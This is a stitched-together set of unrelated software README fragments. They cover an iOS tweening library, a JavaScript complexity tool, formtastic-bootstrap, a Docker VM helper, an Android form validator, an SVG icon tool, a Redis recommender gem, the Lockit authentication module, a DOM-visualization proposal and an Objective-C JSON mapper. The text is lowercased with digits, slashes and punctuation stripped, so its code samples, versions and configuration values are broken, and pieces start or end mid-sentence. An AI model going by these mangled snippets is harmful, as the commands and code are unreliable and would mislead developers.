to prtweentimingfunctionbounceout and running your code again you should see a similar animation play out but this time a bounce will be added to the end of it prtween comes bundled with a number of timing functions for your convenience prtweentimingfunctionlinear prtweentimingfunctionback in and out and inout prtweentimingfunctionbounce in and out and inout prtweentimingfunctioncirc in and out and inout prtweentimingfunctioncubic in and out and inout prtweentimingfunctionelastic in and out and inout prtweentimingfunctionexpo in and out and inout prtweentimingfunctionquad in and out and inout prtweentimingfunctionquart in and out and inout prtweentimingfunctionquint in and out and inout prtweentimingfunctionsine in and out and inout you should take some time to experiment with prtween s timing functions in your applications to see which ones you like best whenever timingfunction is omitted from a tween in prtween the default timing function is used this is accessible through the defaulttimingfunction property on prtween  although you will generally access it through prtween sharedinstance defaulttimingfunction custom functions one of the most powerful capabilities of prtween is the ability to write your own timing functions in lieu of documentation at this time have a look through prtweentimingfunctions m for example timing functions shorthand the code in the examples above is far from unwieldy but it could still stand to be simplified for the most common cases prtween offers shorthand functionality to reduce the amount of code that needs to be written for example a simple alpha tween may be written concisely as objective c prtween tween testview property alpha from  to  duration  you can also directly tween values that might not be properties suppose you re developing a game that has a scrollposition cgfloat objective c prtween tween scrollposition from  to  duration  prtween currently supports the following base shorthands objective c and and for properties on objects prtween tween property from to duration timingfunction target completeselector prtween tween property from to duration and and for values prtween tween from to duration timingfunction target completeselector prtween tween from to duration prtween also supports shorthands for blocks and lerps explained below fallbacks in many cases the uiview or core animation functionality bundled with ios will do the job just fine prtween attempts to be intelligent about this and will use a fallback for any property that can be animated by uiview or core animation for example writing this code in prtween objective c prtween tween someview property alpha from  to  duration  is identical to writing this code without prtween objective c someview alpha  uiview beginanimations nil context null uiview setanimationduration  someview alpha  uiview commitanimations fallbacks can be disabled on a case by case basis with the following syntax objective c prtween tween someview property alpha from  to  duration  override yes or globally objective c prtween sharedinstance usebuiltinanimationswhenpossible no the following uiview properties are eligible for uiview fallbacks transform contentstretch the following calayer properties are eligible core animation fallbacks position zposition anchorpoint anchorpointz contentsrect contentsscale contentscenter cornerradius borderwidth opacity shadowopacity shadowoffset shadowradius support for cgcolor cgpath and catransformd properties for fallbacks is forthcoming note the using an unsupported timing function will disqualify an animation that was eligible for fallbacks only the built in curves bundled with ios are supported for fallbacks they can be accessed through the following prtweentimingfunctioncalinear prtweentimingfunctioncaeasein prtweentimingfunctioncaeaseout prtweentimingfunctioncaeaseinout prtweentimingfunctioncadefault prtweentimingfunctionuiviewlinear prtweentimingfunctionuivieweasein prtweentimingfunctionuivieweaseout prtweentimingfunctionuivieweaseinout if you are targeting ios  or greater you can take advantage of blocks when using prtween blocks are particularly useful for keeping all your code in one place for example we could remove the update method from the example above and replace it with the following line in our declaration of operation objective c operation updateblock prtweenperiod period testview frame cgrectmake  period tweenedvalue   you can also use blocks to execute code after the animation is complete objective c operation completeblock nslog all done blocks are also available on shorthands objective c and and for properties on objects prtween tween property from to duration timingfunction updateblock completeblock and and for values prtween tween from to duration timingfunction updateblock completeblock sometimes you will find it necessary to animate a complex value such as a cgpoint although you could write two tweens for the x and y fields it is much simpler to use linear interpolation or lerps in prtween a lerp is differentiated from a normal tween by using a prtweenlerpperiod for example we might change our declaration of period above objective c prtweencgpointlerpperiod period prtweencgpointlerpperiod periodwithstartcgpoint cgpointmake   endcgpoint cgpointmake   duration  prtween currently has built in lerps for cgpoint and cgrect and cgsize through prtweencgpointlerpperiod  prtweencgrectlerpperiod and prtweencgsizelerpperiod lerps are also available as shorthands objective c and and for cgpoint prtweencgpointlerp lerp property from to duration timingfunction target completeselector prtweencgpointlerp lerp property from to duration and and for cgsize prtweencgsizelerp lerp

completeblock prtweencgsizelerp lerp property from to duration timingfunction target updateblock completeblock prtweencgrectlerp lerp property from to duration timingfunction target updateblock completeblock custom lerps one of the most powerful features of prtween is its ability to use custom lerps in general classes that subclass prtweenlerpperiod and implement the prtweenlerpperiod protocol may be used as custom lerps this allows us to tween any complex numerical value with ease documentation is forthcoming but for now you can check the code behind prtweencgpointlerpperiod for more details api docs are coming shortly until then you are encouraged to dig through the code for details on advanced functionality prtween is very minimal so you can probably figure everything out

complexity is the quality of consisting of many interrelated parts when software consists of many interrelated parts it becomes more difficult to reason about software that is difficult to reason about is a more fertile breeding ground for bugs than software that is simple every problem space contains some level of inherent complexity which is shared by all possible solutions however as programmers we can reduce the complexity of our chosen solutions by limiting the interrelatedness of their constituent components this is commonly referred to as favouring cohesion over coupling and forms the bedrock on which axioms such as the single responsibility principle are built in codebases that are large and and or unfamiliar it can be difficult to know whether regions of complexity exist and where they might be by defining metrics of complexity the search for offending components can be automated and brought into the existing build process alongside other forms of static analysis and unit tests complexity report is just a node js node based command line wrapper around escomplex  which is the library that performs the actual analysis work code is passed to escomplex in the form of syntax trees that have been generated with esprima  the popular javascript parser here is an example report eg the readme for escomplex contains a brief overview of the metrics metrics it produces the numbers returned by this tool should not be interpreted as definitive indicators of whether a piece of software is too complex  whatever that might mean software development is a varied field and every project is subject to a unique set of environmental factors attempts to set generic hard limits for these complexity metrics must essentially be arbitrary and fail to consider the specific requirements of a given project further complexity itself is such an amorphous multi dimensional continuum that attempting to pigeon hole chunks of code at discrete points along a single axis is an intrinsically crude approach it is better to use this tool as a fuzzy high level mechanism which can identify regions of interest or concern and from which your own programming and domain expertise can take over for a more comprehensive analysis although the metrics themselves are not perfect they can help to identify areas of code that warrant closer inspection they can also be tracked over time as an indicator of the direction that overall code quality may be moving in the tool can be configured to fail when complexity metrics pass a specified threshold to aid its usefulness in automated environments and ci there are also options for controlling how metrics are calculated and the format of the report output you must have node js installed nodeinstall then for a

2691743, this version of formtastic bootstrap should support the following bootstrap bootstrap  x rails   x rails  x x formtastic formtastic   x formtastic   x install the gem with gem install formtastic bootstrap or add it to your gemfile gem formtastic bootstrap and install it with tt bundle install and tt add the following line to your formtastic initialization file config and initializers and formtastic rb formtastic helpers formhelper builder formtasticbootstrap formbuilder add the following line to the top of your tt application css and tt file app and assets and stylesheets and application css require formtastic bootstrap make sure you ve already downloaded and installed formtastic do not however require formtastic in your application css file or you will have many bootstrap and formtastic bootstrap styles overwritten this section is out of date in general formtastic creates very verbose html whereas bootstrap expects ever simpler html every attempt has been made to generate the html expected by bootstrap while still generating the rich html provided by formtastic when there is a conflict bootstrap wins this section is out of date formtastic bootstrap omits the tt label and tt class on label tags since twitter bootstrap uses this tag in another context and it makes bad things happen formtastic bootstrap puts the tt input and tt label in a different place because it makes bootstrap behave correctly formtastic bootstrap renders tt date and tt  tt datetime and tt and tt time and tt as text fields since this is how twitter bootstrap presents these data types formtastic renders them as dropdowns some rails magic may have been lost here additionally tt date and tt et al are tagged with the tt stringish and tt class hidden fields are not generated fieldsets are simply nested tt f buttons name and tt is not supported this generates a tt fieldset and tt and tt legend and tt tag which will cause the wrong thing to happen in bootstrap bootstrap is somewhat incomplete and in a few cases an inference needed to be drawn to determine a course of action if you disagree with any of these choices feel free to let me know the gem also provides some shim css where bootstrap is missing styles provided formtastic a lot of the code especially the test suite was copied over from formtastic and then beaten into submission i m sure you ll find some ugliness in there in general i mimicked the formtastic code structure as much as possible in particular bootstrap doesn t say anything about nested tt formfields and tt bootstrap doesn t explicitly lay out a tt boolean and tt control bootstrap doesn t explicitly say everything that needs to be said about tt datetime and tt  tt date and tt  and tt time and tt i ve inferred what tt datetime and tt should do since there s not example of a single tt datetime and tt in some places the markup is tortuous e g tt boolean and tt hopefully as bootstrap evolves these can get simplified bootstrap uses different html classes for sentence based inline and block error messages contributions are welcome formtastic s tt country and tt has not yet been implemented i m sure there s lots in general the usage should be identical to formtastic s some changes have been introduced in order to support bootstrap specific controls to create a prepended text field use the prepend option this works on any text field input type like url  search  and of course string semanticformfor user do and f and f inputs do f input handle prepend end end to create an appended text field use the append option this works on any text field input type like url  search  and of course string semanticformfor user do and f and f inputs do f input handle append end end to add appended elements

15648269, an on demand docker docker virtual machine thanks to vagrant vagrant and bootdocker bootdocker works great on macs and other platforms that don t natively support the docker daemon under the covers this is downloading and booting mitchell hashimoto s bootdocker vagrant box bootdockervagrantbox image the driving need for something like dvm was for running infrastructure testing like test kitchen kitchenci using the kitchen docker driver kitchendocker for the driver to work it needs access to all the dynamically assigned ports not just the docker daemon port that s why dvm uses a private network segment and address     by default once docker started supporting the dockerhost environment variable the actual ip address was less important and consequently made the docker command on non linux distros feel almost native are you already a vagrant user using virtualbox use homebrew great brew install docker brew tap fnichol and dvm brew install dvm eval dvm env docker run ubuntu cat and etc and lsb release p s no vagrant or virtualbox installed check out the requirements requirements section below virtualbox virtualboxdl  version    and  vmware fusion vmwarefusiondl and

dvm    tar gz cd dvm    and sudo make install there is a homebrew tap homebrewdvm with a formula which can be installed with brew tap fnichol and dvm brew install dvm you can follow the instructions for installing install dvm please note however that if the underlying bootdocker basebox is upgraded between versions you will effectively get a new virtual machine when dvm restarts a good idea before upgrading is to destroy your current dvm instance with dvm destroy if using the dvm homebrew tap simply brew update brew upgrade dvm also please read the above note about destroying in between upgrades bring up help with dvm help version v print the version and exit help h display cli help this output check ensure that required software is installed and present destroy stops and deletes all

4794215, android validator  form validator library for android presentation  requirement  and android   and organization  and demo application demo folder coming soon and library library project directory and others others resources directory icon sreenshots and library and tests unit test directory coming soon import in your project  comming soon comming soon in order to execute tests gradle localtest results are available in app and build and reports and tests and index html form validator library is composed of  members form contains all beings validates to treat this is the form that manages the display of error messages in the various elements validate contains all the validators to be treated for a given element validator can define a validation rule the validator is basic class for this library it contains specific validation rules to instanciate validator you just have to do this emailvalidator for example new emailvalidator context for some validators functions can change the validation rules the validator currently contains three basic validation rules and emailvalidator ensures that the field does contain a email address you can also define a regex to check for a particular domain name with the function setdomainname domainregexp example for gmail com domain setdomainname gmail com and notemptyvalidator ensures that the field is not empty and urlvalidator ensures that the field is a valid url and alnumvalidator ensure that the feld has alnum characters and hexvalidator ensure that the field has hex characters and regexppattern ensure that the field does match setted pattern and phonevalidator ensure that the field is a valid phone number and rangevalidator validates whether the given value is bettween a range of values and numericvalidator checks whether the field contains only numeric digits and ipaddressvalidator checks whether the field contains a valid ip address and mockvalidator used by dev as a placeholder while testing validation and custom validator you can create your own validator to do this you can just create class extends abstractvalidator public class customvalidator extends abstractvalidator private int merrormessage r string validatorcustom and and your custom error message public customvalidator context c super c override public boolean isvalid object value and and your validation test is here and and retour true if it s correct false if it s incorrect return true override public string getmessage return mcontext getstring merrormessage the pure validate class is a fifo validator it s test a list of abstractvalidator for specific edittext for some special cases validate is not enough this is why there are specific validates this is why there are two individuals with a validate operation different from that base and confirmvalidate can check whether a value is identical between the two fields can be used to confirm the entry of a password and ortworequiredvalidate if one of the two target fields has a value then it is valid can be used if a user must give his phone or fax and validate the base validate it creates his validators stack basicly validate can only handle a single edittext if you want to manage several at the same time see if confirmvalidate or ortworequiredvalidate match your problem if this is not the case you may need to create your own validate to instantiate a validate you just have to do this validate emailfield new validate email and to add validator stack for example to add a required email field you have to do this emailfield addvalidator new notemptyvalidator mcontext emailfield addvalidator new emailvalidator mcontext the form class is the class teacher of the whole library it is this which manages the processing of each validate validator and displays the error on the edittext automatically the form class stores a validate stack and then you just have to run the validation with the validate function to instanciate form and add validates you have to do this form mform new form mform addvalidates emailfield mform addvalidates confirmfields mform addvalidates urlfield and and launch validation if mform validate and and success statement and and error statement like toast crouton you can close the error using the form can close all errors or just one and and close one error mform closeerror emailfield and and close all errors mform closeallerrors and fork the repo and create a branch git checkout b mybranch and add your changes and commit your changes git commit am added some awesome stuff and push your branch git push origin mybranch and make a pull request to development branch and   create library and   add confirmvalidate and ortworequiredvalidate and   extends emailvalidator with setdomainname and   replace validator by abstractvalidator and   fix bug in urlvalidator and   add alnumvalidator hexvalidator regexpvalidator validatorexception fix validate class and   go to android   for android util patterns add phonevalidator edit urlvalidator and   project reorganization graddle and maven support and    fix bugs optimize code add contributions and    refactoring and cleaning add unittest and    optimize code add new validators and    add validators add closeerror closeallerrors translate into korean set the error message by resid or by specifying a string and    enable gradle builds of the

10862929, is an  at present proof of concept  command line tool that helps you prepare your vector based svg icons for use with the widest possible range of devices it takes a folder of svg files example and weather and processes them to a bunch of files including cleaned versions of the original svg icons optional  a single compact svg icon sprite example and css and weather  and weather  svg  single png icons optional  a combined png icon sprite example and css and weather  and weather  png  several css files with different formats including svg single image icons example and css and weather svg single css optional  svg data uris example and css and weather svg data css  svg sprite references example and css and weather svg sprite css  png single image icons example and css and weather png single css optional  png data uris example and css and weather png data css and png sprite references example and css and weather png sprite css  sass variants example and sass scss dialect of these css files for easy inclusion into your sass project a html fragment example and css and weather loader fragment html including some javascript for asynchronously loading the most appropriate icon variant and finally a couple of html preview documents example and css and weather preview html depending on the options you specified for previewing and testing the different icon variants to leverage iconizr to the greatest extent possible some additional tools have to be installed on the system independently see below requirements iconizr is written in namespaced php and meant to be used on the linux command line i e with the php cli sapi to be honest there was only one reason making me go for php it is what i know best im sure there are quite some other fancy modern languages and techniques one could use for achieving the same but i guess i m just not smart enough for those having said this i d welcome anyone contributing a port of iconizr getting started  as iconizr is written in php there s nothing much of an installation process just put the iconizr phps script along with it s accompanying files and directories to a location of your liking and make sure that it may be executed by setting the proper file permissions if you d like to simplify the invocation of iconizr you might create a symlink into your local executables directory e g ln s and path and to and iconizr phps and usr and local and bin and iconizr run iconizr by calling the script with the apropriate command line options see below documentation please consider that  for security reasons  the output directory has to be a sub sub directory of the current working directory so change your working directory first if necessary cd and path and to and website and docroot and path and to and iconizr phps css out css source and svg or using the symlink mentioned above iconizr css out css source and svg this will take all the svg files found in and path and to and website and docroot and source and svg and render the resulting css files and sprites to the directory and path and to and website and docroot and css and below for the sake of simplicity sass files have been omitted in this example documentation  iconizr options input and dir input and dir css pseudo classes  as of beta  iconizr supports css pseudo classes like e g hover or active states for individual icons to bind an icon to a specific pseudo class just append it as a suffix to the icon file name separated by the string specified with the code pseudo and code parameter defaults to a tilde code and code for example two icon files named foo bar svg foo bar hover svg would result in the css rules icon foo bar icon foo bar hover this way you can easily achieve a normal and a hover state for an icon in general any conceivable pseudo class can be generated like this as long as the involved characters are allowed in file names on your system in fact iconizr isn t aware of what is a real css pseudo class and what isn t it s just dumb delimiter to colon substitution these could be some reasonable examples first child last child nth child the storm icon included in this package is an example for an icon with hover state normal storm icon example and css and weather and weather storm png thunderstorm icon example and css and weather and weather storm hover png in the html preview documents example and css and weather preview html both icons will be shown but also if you hover over the regular one you will see it s hover state as well for every pseudo class iconizr also adds an additional css selector which you can use to explicitly apply the stateful icon styles to an element independently from the element s real state starting with version v   iconizr even adds such a selector for the regular icon state which doesn t have a pseudo class by design  so you can also use this icon variant without letting the other pseudo classes become effective icon foo bar icon foo bar regular icon foo bar hover icon foo bar hover to apply these icon styles to html elements just use them like this span class icon foo bar regular regular icon state and span span class icon foo bar hover hover icon state and span it may seem weird to use colons als parts of css class names but in fact it s perfectly legal  you just have to escape the colons in your css files using a backslash comparison to grunticon   svg files are cleaned and freed from a lot of cruft typically introduced by svg editing application before they get converted to data uris or embedded into the svg sprite  png files are losslessly optimized and optionally quantized to  bit files before being used in data uris or the png sprite  as soon as even one of the icons needs to be loaded externally due to exceeding a potential data uri size limitation  all icons will get loaded via the corresponding sprite evtl kein limit fr data uris bei svg welcher browser mit svg support hat das kleinste data uri limit th colspan  rendering mode and th th grunticon and th th iconizr and th requirements  for iconizr to run you will need some programs installed on your machine these are for svg optimization you will need either of the following or both for png optimization you should have as many of the following as possible other versions  resources  there are some useful resources on data uris in general resources on svg support

user s past history such as you read these  books so you might also like to read  installation  in your gemfile gem predictor getting started  first step is to configure predictor with your redis instance predictor redis redis new url env predictorredis predictor redis redis new url env predictorredis  driver hiredis inputting data  create a class and include the predictor base module define an inputmatrix for each relationship you d like to keep track of this can be anything you think is a significant metric for the item page views purchases categories the item belongs to etc below we re building a recommender to recommend courses based off of users that have taken a course if  courses were taken by the same user this is  times as important to us than if the courses share the same topic this will lead to sets like user course   course   user course   course  tags and their courses this will lead to sets like rails course   course   microeconomics course   course  topics and their courses this will lead to sets like computer science course   course   economics and finance course   course  class courserecommender include predictor base inputmatrix users weight

course   course  recommender processitems course   course  as noted above it s important to remember that if you don t use the bang method addtomatrix  you ll need to manually update your similarities if your dataset is even remotely large you ll probably want to do this if you want to update the similarities for certain item s recommender processitems item item etc if you want to update all similarities for all items recommender process retrieving similarities and recommendations  now that your matrices have been initialized with several relationships you can start generating similarities and recommendations first let s start with similarities which will use the weights we specify on each matrix to determine which courses share the most in common with a given course

similarities  class courserecommender include predictor base limitsimilaritiesto  inputmatrix users weight   inputmatrix tags weight   inputmatrix topics weight   the memory penalty can be heavy though in our testing similarity caches for  objects varied in size like so limitsimilaritiesto    mb this is the default limitsimilaritiesto    mb limitsimilaritiesto    mb if you decide you need to store more than  similarities you may want to see the redis documentation linked above and consider increasing zset max ziplist entries in your configuration predictions fetched with the predictionsfor call utilizes the similarity caches so if you re using predictionsfor make sure you set the limit high enough so that intelligent predictions can be generated if you aren t using predictions and are just using similarities then feel free to set this to the maximum number of similarities you d possibly want to show you can also use limitsimilaritiesto nil to remove the limit entirely this means if you have  items and each item is somehow related to the other you ll have  sets each with  items which will run up your redis bill quite quickly removing the limit is not recommended unless you re sure you know what you re doing if at some point you decide to lower your similarity limits you ll want to be sure to shrink the size of the sorted sets already in redis you can do this with courserecommender new ensuresimilaritylimitisobeyed  what if you want to recommend courses to users based not only on what courses they ve taken but on other attributes of courses that they may be interested in you can do that by passing the boost argument to predictionsfor class courserecommender include predictor base courses are compared to one another by the users taking

recommender courserecommender new super recommender redisprefix predictor courserecommender super processing items  as of    there are now multiple techniques available for processing item similarities you can choose between them by setting a global default like predictor processingtechnique lua or setting a technique for certain classes like courserecommender processingtechnique union there are three values ruby this is the default and is how predictor calculated similarities before    with this technique the jaccard and sorensen calculations are performed in ruby with frequent calls to redis to retrieve simple values it is somewhat slow lua this option performs the jaccard and sorensen calculations in a lua script on the redis server it is substantially faster than the ruby technique but blocks the redis server while each set of calculations are run the period of blocking will vary based on the size and disposition of your data but each call may take up to several hundred milliseconds if your application requires your redis server to always return results quickly and you re not able to simply run calculations during off hours you should use a different strategy union this option skips jaccard and sorensen entirely and uses a simpler technique involving a zunionstore across many item sets to calculate similarities the results are different from but similar to the results of using the jaccard and sorensen algorithms it is even faster than the lua option and does not have the same problem of blocking redis for long periods of time but before using it you should sample the output to ensure that it is good enough for your application predictor now contains a benchmarking script that you can use to compare the speed of these options an example output from the processing of a relatively small dataset is ruby   seconds lua   seconds union   seconds upgrading from   to    as mentioned    is quite a bit different than    so simply upgrading with no changes likely won t work my apologies for this i promise this won t happen in future releases as i m much more confident in this predictor release than the last anywho upgrading really shouldn t be that much of a pain if you follow these steps change predictor matrix addset and predictor matrix addsingle calls to predictor addtomatrix for example predictor topics addsingle topic   course

session in your express app js var cookiesession require cookie session var lockit require lockit var lockit new lockit app use cookiesession secret my super secret string app use lockit router by default lockit uses an in memory sqlite database so you don t have to set up any db lockit will just work for production use a persistent data store  install and require npm install lockit save var config require and config js var lockit require lockit var app express and and express middleware and and sessions are required app use cookieparser app use cookiesession secret your secret here var lockit new lockit config app use lockit router and and you now have all the routes like and login and signup etc and and and you can listen on events for example signup lockit on signup  function user res console log a new user signed up res send welcome and and set signup handleresponse to false for this to work  add styles you can use your own ones custom views though use bootstrap cdn and add the following line to your layout jade jade link rel stylesheet  href and and netdna bootstrapcdn com and bootstrap and    and css and bootstrap min css  install database adapter npm install lockit db adapter where db can be and database and command and and and and if you use a sql database you also have to install the connector npm install pg for postgres npm install mysql for mysql npm install sqlite for sqlite npm install mariasql for mariasql you need a config js somewhere in your app add the database connection string to your config js and and database settings for couchdb and and or if you want to use mongodb and and exports db and and url mongodb and and     and  and and name test  and and collection users and and collection name for mongodb and and postgresql and and exports db and and url postgres and and      and  and and name users  and and collection myusertable and and table name for sql databases and and exports db and and url mysql and and      and  and and name users  and and collection myusertable and and sqlite and and exports db and and url sqlite and and  and and name memory  and and collection myusertable by default the email service is stubbed and no emails are sent that means that you won t receive any signup and password reset tokens you have to look them up in your database and call the routes manually e g and signup and token to send emails you need an email server and you have to change the settings in your config js emailtype usually nodemailer smtp transport exports emailtype nodemailer smtp transport exports emailsettings service mailgun  auth user postmaster username mailgun org  pass secret password lockit comes with built in views which are based on bootstrap if you want to use your own custom views you can it is dead simple put them into your views folder for example views and lockit and mylogin jade then edit your config js and set the path to your custom view exports login route and login  logoutroute and logout  views login lockit and mylogin jade  loggedout lockit and mylogoutsuccess jade the only thing you have to keep in mind is the structure the login views login view for example needs a form element with two input fields the method has to be post and action should point to your login route the input fields have to have the names login and password if something went wrong during the login process you ll get an error variable that you can use in your template here is a minimalistic example for an alternative mylogin jade extend and layout block content h login form action and login  method post label for login email or username input type text  id login  name login  placeholder your email or username label for password password input type password  id password  name password  placeholder your password if error p error input type submit  value login for more information about each view see the views folder inside the different repositories make sure your view extends and layout which is different to your normal views they extend layout without the slash this is required to find the view lockit emits the most important events for user authentication those are signup login logout delete you can use these events to intercept requests and implement some custom logic like getting the gravatar before sending a response to the client a new user signed up the callback function has two arguments user is an object and contains information about the new user like user name or user email res is the standard express js res object with methods like res render and res send if you ve set signup handleresponse to false lockit will not handle the response for you you therefore have to send the response back to the client manually or otherwise it will wait forever lockit on signup  function user res a user logged in callback function this time has three arguments user is again the json object containing info about that particular user res is the normal express js response object with all properties and methods target is the redirect target route after a successful login i e and settings lockit on login  function user res target a user forgot the password and an email has been sent callback function has two arguments user is again the json object containing info about that particular user res is the normal express js response object with all properties and methods lockit on forgot sent  function user res user has created a new password callback function has two arguments user is again the json object containing info about that particular user res is the normal express js response object with all properties and methods lockit on forgot success  function user res a user logged out same as above without the target string lockit on logout  function user res a user deleted an account same callback as above lockit on delete  function user res in a single page application spa all routing and template rendering is done on the client before version    lockit caught relevant routes like and login or and signup  and did the entire rendering on the server starting with version    you re able to use lockit as a rest api and communicate via json all you have to do is set exports rest in your config js exports rest and and set starting page for single page app index public and index html  and and use view engine render or send static file sendfile useviewengine false with rest enabled all default routes get a and rest prefix so you can catch and login on the client to allow for true page refreshes i e user is at and login and refreshes the page all routes on the server like and login and and signup  send the rest index view to the client from there your spa has to take over here is a short example how the process works  user sends get request for and login  server has a route handler for this request and sends index html back  client router takes over and renders and login page  user enters credentials and submits the form  client controller catches submit and sends post via ajax request to and rest and login  server handles post request and validates user credentials  server sends status code  or some json with error message  client reacts to json from server and redirects on success or shows error using angularjs on the client side if you want to go crazy and customize all the things you can and and name for subject and email content exports appname lockit test app and and url for proper link generation and and email settings same as nodemailer exports emailtype nodemailer stub transport exports emailsettings service none  auth user none  pass none and and whenever a library uses request under the hood like nano in lockit couchdb adapter and and the following values will be used exports requestdefaults and and email template from npm exports emailtemplate lockit template blank and and render views or json for single page apps exports rest false and and or if you want to use rest and and exports rest and and and and set

experimented with various techniques of achieving the desired visualization results and polished user experience by implementing a few of the required features and asking for feedback from knowledgeable people working in the domain as a result some key aspects must be pointed out building an internal representation of the dom shall be achieved by creating an iframe overlay in xul as a firefox extension from experience other techniques like injecting code into a web page using already existing extensions like firebug  or depending on cloud services or cgi scripts are all bad ideas as they are not scalable deliver inconsistent user experience and don t leave the original dom intact each node will be rendered as a stack element roughly described as representing a  box  having the x and y positions grabbed from the object s off screen rendered coordinates using html canvas functions therefore avoiding manually redrawing the entire web page  and distributed on the z depth axis based on the actual node depth in the dom tree the base node will be represented by the body upon which the child elements are layered to form a d stack of platforms these platforms shall be build at the addition of divs uls or other nodes containing children some elements are positioned in absolute or floating manners these could be graphically represented in different ways like a shadowing plane or by graphically adding a floating animation various other minimal information characteristics or attributes will be visually attached to each stack representation of a node with the possibility of displaying these properties more in depth at the user s interaction with the visualization therefore it s a good idea to implement features that help understanding and analyzing the dom not just displaying it if required a useful  map of the dom tree will be available used for rapid navigation and orientation through the visualization the display will require intuitive controls therefore an arcball controlled camera will be used from the papers of ken shoemake describing general purpose d rotation moreover panning will be required for navigation and other yaw pitch and roll controls could be implemented sliders or other ui elements could be used for modifying or setting the visualization parameters like the distance between node layers auto rotation and other effects the tool will be used as part of a web page inspector therefore a clean visualization will be more suited a polished representation not a bloated one with subtle screen space ambient occlusion a bit of lighting and shadowing is more appropriate and visually pleasing adding a  stark feel to it thus focusing on the beauty of the web page itself and the dom and not on the achievable effects ways of exporting the visualization to other webgl compatible browsers should be implemented for cross platform and cross browser user experience this can be done by saving the representation parameters and passing them to other browsers in the end the export feature will actually be an url as tilt is designed to also be fun a few easter eggs could be implemented  a stand alone firefox extension which will contain the visualization  a webgl javascript library designed to facilitate creating web page dom visualizations  examples test cases stress tests and documentation so that the tool will continue to be developed even after the finalization of gsoc both by me and the desiring community

11346085, nsobject and objectmap  this is a drop in category of nsobject that makes it easy to initialize custom objects from json or xml soap included  and to serialize those objects back into json and xml it only requires a little bit of set up and then you never have to fuss with creating your own serialization and initialization methods for each custom nsobject ever again version    the only step is to add nsobject and objectmap hm into your project that s really it  creating your objects this step requires knowing what the json coming back will look like examine your data source and create your custom nsobject classes to match this for instance say you have json coming back like this username big al  password rlltd  color crimson  location tuscaloosa al  championships  if this were the case you would create your custom nsobject where its properties match this property nonatomic retain nsstring username property nonatomic retain nsstring password property nonatomic retain nsstring color property nonatomic retain nsstring location property nonatomic retain nsnumber championships the beautiful thing about this class is that beyond basic objective c classes like nsstring and nsnumber it can handle any object that you create as well let s call the previous class definition code user and code and now let s make an object that has a user class object for a property and and json snippet name bryant denny  createdbyuser username big al  password rlltd  color crimson  location tuscaloosa al  championships  and and place h property nonatomic retain nsstring name property nonatomic retain user createdbyuser code nsobject and objectmap and code works by deserializing the json and matching the various keys in the json packet with the various properties of your objects you want to map to the caveat of this design is that you must name your properties the exact same as the keys coming back or that property will be left uninitialized nil when the deserialization is done working with arrays unfortunately with json you re flying blind with regards to the type of objects encased in arrays one more set up step is necessary for json deserialization to an nsobject if your custom nsobject contains one or more nsarray s  you need to create a custom init method for this object or include the following code in your already created custom init this method is creating an nsdictionary called code propertyarraymap and code with key and value pairs that match the property name key with the type of object you want the nsarray to contain value when the object is created from your json packet and the property it is working on is an nsarray it will check this dictionary to find what kind of objects it needs to create inside the array here s an example of setting it up and and json snippet name billy  favoritecolors red  blue  tangerine  favoritepeople name jenny  favoritecolors orange  black  favoritepeople name ben  favoritecolors silver  emerald  aquamarine  favoritepeople and and person h property nonatomic retain nsstring name property nonatomic retain nsarray favoritecolors property nonatomic retain nsarray favoritepeople and and person m id init self super init if self self setvalue nsstring forkeypath propertyarraymap favoritecolors self setvalue person forkeypath propertyarraymap favoritepeople return self so in this example we have a json string that represents a person this person has a name and two array properties favoritecolors and favoritepeople favoritecolors is an array of strings and favoritepeople is an array of person objects as you can tell the custom init method we created for person m sets the code propertyarraymap and code up to handle what type of object should be contained in the setvalue and what key to match it to forkeypath as with the other properties and keys mentioned earlier make sure that these are spelled correctly for proper deserialization and object creation going from json to object at this point you should have your custom nsobjects created and your json data returning from a webservice ready to be turned directly into those objects now for the easy part use the built in nsjsonserialization methods to turn your json data into an nsdictionary or an nsarray then we re going to pass that into a method that will return your custom nsobject from that we re going to use the person json snippet from earlier to illustrate this and and json snippet name billy  favoritecolors red  blue  tangerine  favoritepeople name jenny  favoritecolors orange  black  favoritepeople name ben  favoritecolors silver  emerald  aquamarine  favoritepeople and and turn that json into an nsdictionary then into your person object and and jsondata is the nsdata equivalent of the json snippet above nsdata jsondata and and now to create the person object person newperson person alloc initwithjsondata jsondata using an array almost the exact same but instead of an nsdictionary returning from the json deserialization you ve received an nsarray if this nsarray contains a bunch of person objects use the following method to create this array nsarray peoplearray nsobject arrayoftype person class fromjsondata jsondata serializing object to json most modern web services and apis use json post data to pass objects that can be handled server side using this class to create your json data could not be easier person newperson person alloc init nsdata jsondata newperson jsondata to see a string representation of what that json packet would look like use the code nsobject jsonstring and code method that returns an nsstring instead of nsdata you can make sure this is valid json by using any number of validation tools online like jsonlint com troubleshooting because of the caveats listed earlier here s a list of items to check and consider if the class isn t working like it should properties of objects are named the exact same as the corresponding keys in your json your json object is actually an nsdictionary or nsarray  and didn t fail in deserialization if your nsobjects contain nsarray properties you used the custom init method to set up the code propertyarraymap and code keys and values and named those correctly your omdateformat and omtimezone defines were set to the correct format  creating your objects this step requires knowing what the xml coming back will look like examine your data source and create your custom nsobject classes to match this for instance say you have xml coming back like this myobject username big al and username password rlltd and password color crimson and color location tuscaloosa al and location championships  and championships myobject if this were the case you would create your custom nsobject named code myobject and code where its properties match this property nonatomic retain nsstring username property nonatomic retain nsstring password property nonatomic retain nsstring color property nonatomic retain nsstring location property nonatomic retain nsnumber championships serialization and deserialization just like the json side of things nested complex objects are supported in xml also there is no need to specify array types so working with xml is arguably more simple to serialize an object to xml simply do the following myobject object myobject alloc init and and fill in object properties with data here nsdata xmldata object xmldata and and send data over web deserializing back from xml is just as easy and and xml string of object nsstring xmlstring myobject username big al and username password rlltd and password color crimson and color location tuscaloosa al and location championships  and championships myobject and and xml data nsdata xmldata xmlstring datausingencoding nsutfstringencoding and and create myobject myobject customobject myobject alloc initwithxmldata xmldata note on soap at this point only simple tag driven soap is supported support for more complex namespace and attribute handling will come if the need arises feel free to make a pull request if you find a great way to handle more complex soap  in the code nsobject and objectmap h and code file there are two define constants representing the format and timezone information for nsdate deserialization match these to the json and xml you are getting back so that nsdateformatter creates the nsdate objects correctly these properties are omdateformat omtimezone  to see nsobject and objectmap in action check out one of our many sample xcode projects under the code demos and code folder in the top level the google places demo illustrates nsobject and objectmap s json handling while the weather demo takes care of xml make sure to check out their readmes to figure out any setup work before running  we have an entire new unit testing suite to make sure objectmap is actually working after any changes to it you can run this by opening the code unittests xcodeproj and code under the tests folder just hit code cmd u and code on the keyboard to run them and watch to see if it says tests succeeded on screen sometimes it will say tests failed  but if you look in each of the testcase classes 